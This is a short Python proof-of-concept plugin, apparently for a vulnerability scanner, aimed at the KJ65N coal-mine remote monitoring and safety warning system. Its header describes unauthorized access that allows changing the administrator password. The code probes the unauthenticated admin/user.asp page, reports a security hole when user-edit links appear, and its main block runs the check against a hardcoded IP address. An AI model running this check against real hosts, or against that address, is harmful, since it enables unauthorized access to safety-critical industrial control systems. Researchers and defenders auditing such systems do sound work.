#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  KJ65N煤矿远程监控安全预警系统 未授权访问修改管理员密码
Author    :  a
mail      :  a@lcx.cc
refer     ：WooYun-2015-131730 工控系列

"""
import urlparse
import time

def assign(service, arg):
    if service == 'kj65n_monitor':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    p = 'admin/user.asp'
    url = arg + p
    code, head, res, errcode, _ = curl.curl2(url )
    if (code == 200) and('userEdit.asp?userId=' in res) and ('userMenuEdit.asp?userId=' in res):
        security_hole(url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('kj65n_monitor', 'http://220.176.168.75:8001/')[1])